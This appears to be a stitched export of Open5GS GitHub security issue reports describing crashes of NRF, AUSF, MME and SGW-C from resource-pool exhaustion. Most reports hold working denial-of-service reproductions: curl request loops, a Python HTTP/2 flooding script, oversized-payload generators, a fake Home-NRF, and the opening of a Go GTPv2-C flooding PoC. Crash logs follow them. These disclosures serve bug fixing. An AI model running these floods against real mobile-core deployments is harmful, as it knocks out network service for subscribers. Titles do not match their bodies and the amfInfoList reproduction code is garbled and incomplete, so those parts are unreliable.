items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when repeated valid `POST /nnrf-nfm/v1/subscriptions` requests use
distinct `nfStatusNotificationUri` hosts and exhaust the fixed `client_pool`.

The subscription creation path accepts the request body, allocates
`subscription_data`, parses the notification URI, and then does:

```c
client = ogs_sbi_client_find(scheme, fqdn, fqdn_port, addr, addr6);
if (!client) {
    client = ogs_sbi_client_add(scheme, fqdn, fqdn_port, addr, addr6);
    ogs_assert(client);
}
```

`ogs_sbi_client_add()` returns `NULL` when `client_pool` is exhausted:

```c
ogs_pool_alloc(&client_pool, &client);
if (!client) {
    ogs_error("No memory in client_pool");
    return NULL;
}
```

Pool sizing makes this reachable before the already-known subscription pool
exhaustion case:

```c
ogs_app()->pool.nf = global_conf.max.peer;
ogs_app()->pool.subscription = ogs_app()->pool.nf * 16;
```

With default settings, `client_pool` is only `64`, while
`subscription_data_pool` is `1024`. An attacker can therefore crash NRF much
earlier simply by varying the notification host across otherwise valid
subscription requests.

### Root cause

- Entry route:
  `POST /nnrf-nfm/v1/subscriptions`
- Exact crash site:
  `../src/nrf/nnrf-handler.c:603`
- Helper failure:
  `../lib/sbi/client.c:115-118`
- Pool sizing:
  `../lib/app/ogs-config.c:79-84`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling factor:
  number of distinct notification endpoints that require fresh SBI clients

### Steps to reproduce

1. Resolve the current NRF container IP and reset the container:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
docker restart nrf >/dev/null
sleep 2
echo "$NRF_IP"
```

2. Control case: same route and same body shape, but reuse a single
   notification host for 70 requests. This should not crash NRF.

```bash
i=0
ok=0
while [ $i -lt 70 ]; do
  i=$((i+1))
  code=$(curl --http2-prior-knowledge -sS -o /dev/null -w '%{http_code}' -m 5 \
    -X POST "http://$NRF_IP/nnrf-nfm/v1/subscriptions" \
    -H 'content-type: application/json' \
    --data '{"nfStatusNotificationUri":"http://notify-control.example.org:9999/cb","reqNfType":"AMF","subscrCond":{"nfType":"UDM"}}') || {
      echo "fail_at=$i curl_error"
      break
    }
  [ "$code" = "201" ] || {
    echo "fail_at=$i http_code=$code"
    break
  }
  ok=$i
done
echo "ok=$ok"
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.RestartCount}}' nrf
```

3. Malicious case: restart NRF, then vary only the notification host so each
   request forces a fresh SBI client allocation.

```bash
docker restart nrf >/dev/null
sleep 2
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)

i=0
ok=0
while [ $i -lt 100 ]; do
  i=$((i+1))
  host=$(printf 'notify-%03d.example.org' "$i")
  payload=$(printf \
    '{"nfStatusNotificationUri":"http://%s:9999/cb","reqNfType":"AMF","subscrCond":{"nfType":"UDM"}}' \
    "$host")
  code=$(curl --http2-prior-knowledge -sS -o /dev/null -w '%{http_code}' -m 5 \
    -X POST "http://$NRF_IP/nnrf-nfm/v1/subscriptions" \
    -H 'content-type: application/json' \
    --data "$payload") || {
      echo "fail_at=$i curl_error"
      break
    }
  [ "$code" = "201" ] || {
    echo "fail_at=$i http_code=$code"
    break
  }
  ok=$i
done
echo "ok=$ok"
docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 12
```

### Logs

```shell
Control run:


ok=70
running 0 0


Malicious run:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream
fail_at=65 curl_error
ok=64


Container state after the crash:


exited 139 2026-04-12T06:13:46.384859466Z 0


NRF logs:


04/12 06:13:46.262: [nrf] INFO: Setup NF EndPoint(fqdn) [notify-064.example.org:9999] (../src/nrf/nnrf-handler.c:605)
04/12 06:13:46.262: [nrf] INFO: [c3949bf2-3636-41f1-9eed-dfb664711a2e] Subscription created until 2026-04-13T06:13:46.262674+00:00 [duration:86400000000,validity:86400.000000] (../src/nrf/nnrf-handler.c:633)
04/12 06:13:46.267: [sbi] ERROR: No memory in client_pool (../lib/sbi/client.c:117)
04/12 06:13:46.267: [nrf] FATAL: nrf_nnrf_handle_nf_status_subscribe: Assertion `client' failed. (../src/nrf/nnrf-handler.c:603)
04/12 06:13:46.267: [core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should reject excessive unique notification endpoints with a normal HTTP error such as `429`, `503`, or `507`, and remain running.

### Observed Behaviour

The `65`th valid subscription request with a fresh notification host exhausts `client_pool` and terminates the NRF process with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: [Bug]: NRF crash on inter-PLMN `NNRF_DISC` `SearchResult` by exhausting the NF instance pool

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when an inter-PLMN discovery request causes the local NRF to query a
Home-PLMN NRF and the Home-NRF `SearchResult` contains too many distinct
`nfInstances`.

This is a client-response trust-boundary bug, not a direct
`nnrf-nfm/nf-instances` registration bug. The local NRF enters the inter-PLMN
fallback path, sends a downstream discovery request to the Home NRF, and then
parses the returned `SearchResult` through:

```c
OpenAPI_list_for_each(SearchResult->nf_instances, node) {
    ...
    nf_instance = ogs_sbi_nf_instance_find(NFProfile->nf_instance_id);
    if (!nf_instance) {
        nf_instance = ogs_sbi_nf_instance_add();
        ogs_assert(nf_instance);
    }
}
```

`ogs_sbi_nf_instance_add()` allocates from a fixed `nf_instance_pool` and
asserts when the pool is exhausted:

```c
ogs_pool_alloc(&nf_instance_pool, &nf_instance);
ogs_assert(nf_instance);
```

Pool sizing comes from the peer limit:

```c
ogs_app()->pool.nf = global_conf.max.peer;
```

With default settings this is `64`. In a fresh NRF process, the pool already
contains the local NRF instance, and the inter-PLMN fallback path also adds a
temporary Home-NRF entry before parsing the response. A malicious Home-NRF
response with enough unique `nfInstances` therefore crashes the local NRF.

### Root cause

- Entry route:
  `GET /nnrf-disc/v1/nf-instances` with inter-PLMN parameters
- Downstream client path:
  local NRF -> Home NRF `GET /nnrf-disc/v1/nf-instances`
- Response iteration site:
  `../src/nrf/nnrf-handler.c:1419-1449`
- Exact crash site:
  `../lib/sbi/context.c:1235-1236`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling field:
  `SearchResult.nfInstances[*].nfInstanceId`

### Steps to Reproduce

1. Run a fake h2c Home NRF on the Docker `open5gs` network:

```bash
docker rm -f hnrfctl 2>/dev/null || true
docker run -d --name hnrfctl --network open5gs --network-alias hnrfctl \
  -e NRF_FAKE_PORT=80 \
  -v /home/ubuntu/open5gs_277/.audit_tmp:/srv \
  node:22-alpine node /srv/nrf_fake_hnrf.js
```

2. Resolve the current local NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

3. Control case: configure the helper to return one benign foreign NF and send
   an inter-PLMN discovery request:

```bash
printf 'control\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 8 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'
```

4. Malicious case: switch the helper to `many-instances`, restart the local
   NRF to clear cached foreign NF entries, and send the same request again:

```bash
printf 'many-instances\n' > /home/ubuntu/open5gs_277/.audit_tmp/nrf_fake_hnrf.mode
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \
  --data-urlencode 'target-plmn-list=[{"mcc":"999","mnc":"70"}]' \
  --data-urlencode 'requester-plmn-list=[{"mcc":"001","mnc":"01"}]' \
  --data-urlencode 'hnrf-uri=http://hnrfctl'

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 20
```

### Logs

```shell
Control response:


HTTP/2 200
{"validityPeriod":30,"nfInstances":[{"nfInstanceId":"fake-foreign-udr-safe",...}]}


Malicious client-visible failure:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream


Container state after the crash:


exited 139 2026-04-12T06:24:40.452605766Z 0


NRF logs:


04/12 06:24:40.364: [nrf] INFO: [fake-foreign-udr-many-062] (NF-discover) NF registered [type:UDR] (../src/nrf/nnrf-handler.c:1460)
04/12 06:24:40.364: [sbi] FATAL: ogs_sbi_nf_instance_add: Assertion `nf_instance' failed. (../lib/sbi/context.c:1236)
04/12 06:24:40.364: [core] FATAL: backtrace() returned 11 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

The local NRF should reject or cap oversized Home-NRF `SearchResult` collections without abortin

### Observed Behaviour

A single malicious Home-NRF discovery response with many distinct NF profiles terminates the local NRF process with exit code `139`.

### eNodeB/gNodeB

items.title: [Bug]: AUSF crashes with SIGABRT at nghttp2-server.c:1599 — memory pool exhaustion from allocate-before-validate pattern

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6 (Docker image `open5gs-fuzz:latest`)

### Steps to reproduce

The AUSF crashes with SIGABRT when its internal memory pool (`ogs_pool_id_calloc`) is exhausted by repeated requests that allocate context before failing routing/version validation, causing context leaks.

**Environment:**
- Docker deployment, bridge network 172.23.0.0/16
- AUSF at 172.23.0.50:7777, NRF and other NFs present
- AUSF compiled from Open5GS v2.7.x using nghttp2 for HTTP/2

**Reproduction steps:**

1. Start Open5GS containers with AUSF running
2. Send requests that allocate context then fail routing:
   ```python
   import socket, ssl, h2.connection, h2.config, json
   
   AUSF_HOST = "172.23.0.50"
   AUSF_PORT = 7777
   
   sock = socket.create_connection((AUSF_HOST, AUSF_PORT), timeout=10)
   ctx = ssl.create_default_context()
   ctx.check_hostname = False
   ctx.verify_mode = ssl.CERT_NONE
   ssock = ctx.wrap_socket(sock, server_hostname=AUSF_HOST)
   
   config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
   conn = h2.connection.H2Connection(config=config)
   conn.initiate_connection()
   ssock.sendall(conn.data_to_send())
   
   # Phase 1: Path traversal — change API version from v1 to v0
   # This triggers "Not supported version [v0]" but context is already allocated
   for i in range(500):
       headers = [
           (':method', 'POST'),
           (':path', '/nausf-auth/v0/ue-authentications'),  # v0 — invalid version
           (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
           (':scheme', 'http'),
           ('content-type', 'application/json'),
           ('content-length', '2'),
       ]
       sid = conn.get_next_available_stream_id()
       conn.send_headers(sid, headers)
       conn.send_data(sid, b'{}', end_stream=True)
       ssock.sendall(conn.data_to_send())
   
   # Phase 2: POST to unregistered endpoint
   # This triggers "Not found [POST]" but context was already allocated
   for i in range(500):
       headers = [
           (':method', 'POST'),
           (':path', '/nausf-auth/v1/unknown-endpoint'),
           (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
           (':scheme', 'http'),
           ('content-type', 'application/json'),
           ('content-length', '2'),
       ]
       sid = conn.get_next_available_stream_id()
       conn.send_headers(sid, headers)
       conn.send_data(sid, b'{}', end_stream=True)
       ssock.sendall(conn.data_to_send())
   # Phase 3: Pool is now exhausted. Send one more request.
   # The HTTP/2 layer tries to create a new stream → assert(stream) fails → SIGABRT
   headers = [
       (':method', 'GET'),
       (':path', '/nausf-auth/v1/ue-authentications'),
       (':authority', f'{AUSF_HOST}:{AUSF_PORT}'),
       (':scheme', 'http'),
   ]
   sid = conn.get_next_available_stream_id()
   conn.send_headers(sid, headers, end_stream=True)
   ssock.sendall(conn.data_to_send())
   ```
Root cause: In `ausf-sm.c`, the AUSF allocates a context from the pool BEFORE validating the API version or request route. When validation fails, the error path returns WITHOUT freeing the context. Repeating this exhausts the pool. When the HTTP/2 server layer (`nghttp2-server.c`) subsequently tries to create a new stream, `assert(stream)` fires because no pool entries are available.

### Logs

```shell
$ docker logs fuzzing-open5gs-ausf --tail 40

[ausf] ERROR: Not supported version [v0] (../src/ausf/ausf-sm.c:92)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not supported version [v0] (../src/ausf/ausf-sm.c:92)
[ausf] ERROR: ogs_pool_id_calloc() failed (../src/ausf/context.c:138)
[ausf] ERROR: Not found [POST] (../src/ausf/ausf-sm.c:159)
... (pattern repeats ~30 times) ...
[sbi] ERROR: ogs_pool_id_calloc() failed (../lib/sbi/nghttp2-server.c:758)
[sbi] FATAL: on_begin_headers: Assertion 'stream' failed. (../lib/sbi/nghttp2-server.c:1599)
[core] FATAL: backtrace() returned 10 addresses (../lib/core/ogs-abort.c:37)

$ docker inspect fuzzing-open5gs-ausf --format '{{.State.ExitCode}}'
(SIGABRT — container status shows "Exited")
```

### Expected behaviour

1. API version and route validation should happen BEFORE context allocation from the memory pool.
2. When validation fails, any already-allocated context should be freed (no leaks on error paths).
3. The memory pool should have a hard upper limit — when exhausted, the AUSF should return HTTP 503 rather than crashing.
4. `assert(stream)` in `nghttp2-server.c:1599` should be replaced with defensive error handling: `if (!stream) return -1;`


### Observed Behaviour

1. Context allocation (`ogs_pool_id_calloc`) at `context.c:138` happens BEFORE version/routing checks at `ausf-sm.c:92,159`. Failed requests leak the allocated context.
2. The `ogs_pool_id_calloc()` failure is logged but the caller does not stop processing — it continues and eventually triggers the assertion in the HTTP/2 layer.
3. The final crash occurs in `nghttp2-server.c:1599` where `assert(stream)` fires because no pool entries remain to create a new HTTP/2 stream.
4. The crash is a SIGABRT from the failed assertion, producing a backtrace at `ogs-abort.c:37`.

### eNodeB/gNodeB

_No response_

### UE Models and versions

_No response_

items.title: [Bug]: NRF crash on `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}` by exhausting the NF-info pool through `smfInfoList`

labels.name: status:already-fixed
labels.description: This issue has already been fixed in the codebase or addressed in a previous issue.

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

NRF aborts when a valid NF registration contains an oversized `smfInfoList` map.

This is not the already-documented `smfInfo.sNssaiSmfInfoList[*].dnnSmfInfoList`
fixed-array assertion. Here the crash comes earlier, because
`ogs_nnrf_nfm_handle_nf_profile()` iterates over every `smfInfoList` entry and
calls `handle_smf_info()` once per entry:

```c
OpenAPI_list_for_each(NFProfile->smf_info_list, node) {
    OpenAPI_map_t *SmfInfoMap = node->data;
    if (SmfInfoMap && SmfInfoMap->value)
        handle_smf_info(nf_instance, SmfInfoMap->value);
}
```

`handle_smf_info()` allocates one `ogs_sbi_nf_info_t` per entry and asserts if
the fixed `nf_info_pool` is exhausted:

```c
nf_info = ogs_sbi_nf_info_add(&nf_instance->nf_info_list, OpenAPI_nf_type_SMF);
ogs_assert(nf_info);
```

`ogs_sbi_nf_info_add()` logs a fatal allocation failure and returns `NULL`:

```c
ogs_pool_alloc(&nf_info_pool, &nf_info);
if (!nf_info) {
    ogs_fatal("ogs_pool_alloc() failed");
    return NULL;
}
```

The pool is sized as:

```c
ogs_pool_init(&nf_info_pool, ogs_app()->pool.nf * OGS_MAX_NUM_OF_NF_INFO);
```

With default settings that becomes `64 * 8 = 512`. A single NF registration
request with enough `smfInfoList` entries can therefore exhaust the pool and
terminate NRF.

### Root cause

- Entry route:
  `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Iteration site:
  `../lib/sbi/nnrf-handler.c:272-275`
- Allocation site:
  `../lib/sbi/nnrf-handler.c:413-415`
- Exact helper failure:
  `../lib/sbi/context.c:1674-1677`
- Root cause family:
  resource exhaustion leading to assertion abort
- Controlling field:
  `NFProfile.smfInfoList`

### Steps to Reproduce

1. Resolve the current NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

2. Generate a small control payload and a large malicious payload:

```bash
node <<'NODE'
const fs = require('fs');

function smfInfoEntry(dnn) {
  return {
    sNssaiSmfInfoList: [
      {
        sNssai: { sst: 1, sd: '000001' },
        dnnSmfInfoList: [{ dnn }],
      },
    ],
  };
}

function makeProfile(id, count) {
  const smfInfoList = {};
  for (let i = 0; i < count; i++) {
    smfInfoList[`entry-${String(i + 1).padStart(4, '0')}`] =
      smfInfoEntry(`dnn-${i + 1}`);
  }
  return {
    nfInstanceId: id,
    nfType: 'SMF',
    nfStatus: 'REGISTERED',
    fqdn: `${id}.example.org`,
    smfInfoList,
  };
}

fs.writeFileSync('/tmp/nrf-smfinfo-list-control.json', JSON.stringify(
  makeProfile('66666666-6666-6666-6666-666666666666', 4)
));
fs.writeFileSync('/tmp/nrf-smfinfo-list-bomb.json', JSON.stringify(
  makeProfile('77777777-7777-7777-7777-777777777777', 520)
));
NODE
```

3. Control case: register the NF with four `smfInfoList` entries.

```bash
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/66666666-6666-6666-6666-666666666666" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-smfinfo-list-control.json
```

4. Malicious case: restart NRF and send the oversized `smfInfoList` profile.

```bash
start_ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
docker restart nrf >/dev/null
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
  -X PUT "http://$NRF_IP/nnrf-nfm/v1/nf-instances/77777777-7777-7777-7777-777777777777" \
  -H 'content-type: application/json' \
  --data @/tmp/nrf-smfinfo-list-bomb.json

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf 2>&1 | tail -n 20
```

### Logs

```shell
Control response:


HTTP/2 201


Malicious client-visible failure:


curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream


Container state after the crash:


exited 139 2026-04-12T06:23:56.878437103Z 0


NRF logs:


04/12 06:23:56.792: [sbi] FATAL: ogs_pool_alloc() failed (../lib/sbi/context.c:1676)
04/12 06:23:56.792: [sbi] FATAL: handle_smf_info: Assertion `nf_info' failed. (../lib/sbi/nnrf-handler.c:415)
04/12 06:23:56.792: [core] FATAL: backtrace() returned 12 addresses (../lib/core/ogs-abort.c:37)
```

### Expected behaviour

NRF should reject unreasonably large `smfInfoList` collections with a normal HTTP error and remain running.

### Observed Behaviour

A single valid NF registration containing an oversized `smfInfoList` map terminates the NRF process with exit code `139`.

### eNodeB/gNodeB

Not required.

### UE Models and versions

Not required.

items.title: MME Crash: EBI Pool Exhaustion during UE Context Relocation

labels.name: type:bug
labels.description: Open5GS bug

items.body:
## Summary

MME can crash with a fatal assertion failure in `mme_bearer_add()` when allocating a new EPS Bearer ID (EBI):

```
[mme] FATAL: mme_bearer_add: Assertion `bearer->ebi_node' failed.
```

This happens because the UE-specific `ebi_pool` can be exhausted (EBI range 5–15), and the current code asserts instead of handling allocation failure gracefully.

The root cause seems to be incorrect EBI pool ownership handling during **MME-UE context relocation** (OLD UE → NEW UE).

---

## Crash Log

```
[mme] FATAL: mme_bearer_add: Assertion `bearer->ebi_node' failed.
(../src/mme/mme-context.c:4571)

Jan 29, 2026 @ 00:42:26.660
01/29 00:42:26.657: [core] FATAL: backtrace() returned 9 addresses
```

The crash occurs here:

```c
ogs_pool_alloc(&mme_ue->ebi_pool, &bearer->ebi_node);
ogs_assert(bearer->ebi_node);  /* crash */
```

---

## Analysis / Root Cause

During IMSI association / UE context transfer, Open5GS migrates session and bearer contexts from an old MME-UE object to a new one.

In `mme_ue_set_imsi()`, the following logic frees the bearer’s EBI node from the **old UE pool**, and then sets it to NULL:

```c
/* Phase-1 : Change MME-UE Context in Session Context */
ogs_list_for_each(&old_mme_ue->sess_list, old_sess) {
    ogs_list_for_each(&old_sess->bearer_list, old_bearer) {
        old_bearer->mme_ue_id = mme_ue->id;

        if (old_bearer->ebi_node)
            ogs_pool_free(&old_mme_ue->ebi_pool, old_bearer->ebi_node);

        old_bearer->ebi_node = NULL;
    }
    old_sess->mme_ue_id = mme_ue->id;
}
```

As a result:

- Bearer objects survive and are now owned by the NEW UE context  
- But their EBI reservation is returned to the OLD UE pool  
- The NEW UE `ebi_pool` is not updated/reserved accordingly  

This causes inconsistency:

- Existing bearers still consume EBIs logically  
- But the NEW UE pool believes all EBIs are free  
- Subsequent bearer creation continues allocating EBIs until the pool is exhausted  
- Eventually `ogs_pool_alloc()` returns NULL → fatal assertion crash  

Additionally, since `bearer->ebi_node` becomes NULL, later `mme_bearer_remove()` does not return the EBI back to the NEW UE pool:

```c
if (bearer->ebi_node)
    ogs_pool_free(&mme_ue->ebi_pool, bearer->ebi_node);
```

So cleanup is skipped.

---

## Expected Behavior

- When bearer contexts are migrated between UE objects, EBI usage must remain consistent  
- EBI allocation failure should be handled gracefully (reject bearer creation with proper cause)  
- MME should not crash due to pool exhaustion  


---

## Environment

- Open5GS: main branch (Jan 2026)  
- Component: MME (EPC)  
- Issue observed during repeated UE context release + bearer re-establishment scenarios  

---

## Additional Notes

Since EBI is a small fixed range (5–15), a bitmap-based allocation may be more robust than keeping pool-internal node pointers inside bearer structures, especially across context migration.

### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

This merged report covers both currently confirmed reachability variants that
hit the same `nf_info_pool` exhaustion crash in `handle_amf_info()`.

This is not the already documented `handle_amf_info()` `tacRangeList`
fixed-array assertion, and it is also distinct from the `smfInfoList`
NF-info-pool exhaustion report. Here the crash happens earlier: the shared
NF-profile import routine iterates over every `amfInfoList` entry and calls
`handle_amf_info()` once per entry:

```c
OpenAPI_list_for_each(NFProfile->amf_info_list, node) {
    OpenAPI_map_t *AmfInfoMap = node->data;
    if (AmfInfoMap && AmfInfoMap->value)
        handle_amf_info(nf_instance, AmfInfoMap->value);
}
```

`handle_amf_info()` allocates one `ogs_sbi_nf_info_t` per entry and asserts if
the fixed `nf_info_pool` is exhausted:

```c
nf_info = ogs_sbi_nf_info_add(&nf_instance->nf_info_list, OpenAPI_nf_type_AMF);
ogs_assert(nf_info);
```

`ogs_sbi_nf_info_add()` logs a fatal allocation failure and returns `NULL`:

```c
ogs_pool_alloc(&nf_info_pool, &nf_info);
if (!nf_info) {
    ogs_fatal("ogs_pool_alloc() failed");
    return NULL;
}
```

The pool is sized as:

```c
ogs_pool_init(&nf_info_pool, ogs_app()->pool.nf * OGS_MAX_NUM_OF_NF_INFO);
```

With default settings that becomes `64 * 8 = 512`. The same exhaustion crash
is reachable via:

1. Direct server-side registration:
   `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
2. Client-response inter-PLMN discovery:
   `GET /nnrf-disc/v1/nf-instances`, where a malicious Home-NRF returns an
   oversized `SearchResult.nfInstances[*].amfInfoList` payload

### Root cause

- Shared crash site:
  `../lib/sbi/nnrf-handler.c:717-719`
- Exact helper failure:
  `../lib/sbi/context.c:1666-1677`
- Pool sizing:
  `../lib/sbi/context.c:62`
- Root cause family:
  resource exhaustion leading to assertion abort
- Direct reachability:
  `PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}`
- Client-response reachability:
  inter-PLMN `GET /nnrf-disc/v1/nf-instances`
- Controlling field:
  `NFProfile.amfInfoList`

### Steps to reproduce

#### Direct reproduction

1. Resolve the current NRF IP:

```bash
NRF_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' nrf)
echo "$NRF_IP"
```

2. Generate a small control payload and a large malicious payload:

```bash
mkdir -p /home/ubuntu/open5gs_277/.audit_tmp

node <<'NODE'

function amfInfoEntry(index) {

      },
    ],
    taiList: [
      {
        plmnId: { mcc: '001', mnc: '01' },
        tac: hex,
      },

}

function makeProfile(id, count) {
  const amfInfoList = {};

    amfInfoList[`entry-${String(i + 1).padStart(4, '0')}`] = amfInfoEntry(i + 1);
  }
  return {
    nfInstanceId: id,
    nfType: 'AMF',
    nfStatus: 'REGISTERED',
    ipv4Addresses: ['127.0.0.1'],
    amfInfoList,
  };
}

fs.writeFileSync('/home/ubuntu/open5gs_277/.audit_tmp/nrf-amfinfo-list-control.json', JSON.stringify(
  makeProfile('88888888-8888-8888-8888-888888888888', 4)

fs.writeFileSync('/home/ubuntu/open5gs_277/.audit_tmp/nrf-amfinfo-list-bomb.json', JSON.stringify(
  makeProfile('99999999-9999-9999-9999-999999999999', 520)

```

3. Control case:

```bash
sleep 2

curl --http2-prior-knowledge -sS -i -m 10 \
```

```bash
curl --http2-prior-knowledge -sS -i -m 10 --get \
  "http://$NRF_IP/nnrf-disc/v1/nf-instances" \
  --data-urlencode 'target-nf-type=UDR' \
  --data-urlencode 'requester-nf-type=UDM' \

docker inspect -f '{{.State.Status}} {{.State.ExitCode}} {{.State.FinishedAt}} {{.RestartCount}}' nrf
docker logs --since "$start_ts" nrf
```

Observed in the confirmed run:

```text
HTTP/2 200
curl: (92) HTTP/2 stream 1 was not closed cleanly before end of the underlying stream
exited 139 2026-04-24T01:47:19.329911479Z 0
04/24 01:47:19.149: [nrf] INFO: [fake-foreign-udr-amfinfo-list-pool] (NF-discover) NF registered [type:UDR] (../src/nrf/nnrf-handler.c:1460)
04/24 01:47:19.150: [sbi] FATAL: ogs_pool_alloc() failed (../lib/sbi/context.c:1676)
04/24 01:47:19.150: [sbi] FATAL: handle_amf_info: Assertion `nf_info' failed. (../lib/sbi/nnrf-handler.c:719)
```


### Logs

```shell

exited 139 2026-04-24T01:47:19.329911479Z 0
04/24 01:47:19.149: [nrf] INFO: [fake-foreign-udr-amfinfo-list-pool] (NF-discover) NF registered [type:UDR] (../src/nrf/nnrf-handler.c:1460)
```

items.title: [Bug]: SGW-C crashes via PFCP transaction timer pool exhaustion (ogs_assert(xact->tm_delayed_commit))

labels.name: status:already-fixed

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

### Description
SGW-C can be remotely crashed through GTPv2-C Create Session Request flooding (with PGW F-TEID) that exhausts the global timer pool.
When a large number of CSR requests are sent to SGW-C, SGW-C proceeds with forwarding logic and creates many PFCP “local transactions” to communicate with SGW-U. Each PFCP transaction allocates timers (e.g., tm_delayed_commit) from the global timer pool. Once the timer pool is exhausted, ogs_pool_alloc() fails. Immediately after that, transaction creation hits an assertion: ogs_pfcp_xact_local_create: Assertion 'xact->tm_delayed_commit' failed (lib/pfcp/xact.c:104), causing a denial-of-service.
1. Start a new go project inside a new folder: `go mod init poc`
2. Create a `main.go` and paste the code below:
```
// Vuln-PC1-13 Varient PoC: PFCP Local Transaction Pool Exhaustion
// Target: SGW-C - ogs_pfcp_xact_local_create() assertion
// Crash Location: lib/pfcp/xact.c:104
// Assertion: ogs_assert(xact->tm_delayed_commit)
//
// Attack Strategy:
// - Send CSR WITH PGW F-TEID (triggers forwarding to PGW)
// - SGW-C creates PFCP transactions to communicate with SGW-U
// - Timer pool exhausts -> PFCP xact timer allocation fails
// - ogs_timer_add() returns NULL -> assertion fails

package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"sync"
	"time"

	"github.com/wmnsk/go-gtp/gtpv2"
	"github.com/wmnsk/go-gtp/gtpv2/ie"
	"github.com/wmnsk/go-gtp/gtpv2/message"
)

var (
	target      = flag.String("target", "", "Target SGW-C IP (required)")
	port        = flag.Int("port", 2123, "GTP-C port")
	pgwIP       = flag.String("pgw-ip", "10.44.44.4", "PGW/SMF IP address")
	count       = flag.Int("count", 500, "Number of requests to send")
	concurrency = flag.Int("concurrency", 50, "Number of concurrent senders")
	delay       = flag.Duration("delay", 1*time.Millisecond, "Delay between requests")
	maxUE       = flag.Int("max-ue", 1, "Number of unique IMSIs")
)

func main() {
	flag.Parse()

	if *target == "" {
		log.Fatal("--target is required")
	}

	fmt.Println("==========================================================")
	fmt.Println("Vuln-PC1-13 PoC: ogs_pfcp_xact_local_create Assertion")
	fmt.Println("==========================================================")
	fmt.Printf("[*] Target: %s:%d (SGW-C S11)\n", *target, *port)
	fmt.Printf("[*] PGW IP: %s\n", *pgwIP)
	fmt.Printf("[*] Crash Location: lib/pfcp/xact.c:104\n")
	fmt.Printf("[*] Assertion: ogs_assert(xact->tm_delayed_commit)\n")
	fmt.Println("[*] Strategy: CSR with PGW F-TEID -> PFCP to SGW-U -> pool exhaustion")
	fmt.Println("----------------------------------------------------------")

	addr := fmt.Sprintf("%s:%d", *target, *port)
	remoteAddr, err := net.ResolveUDPAddr("udp", addr)
	if err != nil {
		log.Fatalf("Failed to resolve address: %v", err)
	}

	var wg sync.WaitGroup
	requestsPerWorker := *count / *concurrency
	sentCount := 0
	var mu sync.Mutex

	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()

			conn, err := net.DialUDP("udp", nil, remoteAddr)
			if err != nil {
				return
			}
			defer conn.Close()

			for j := 0; j < requestsPerWorker; j++ {
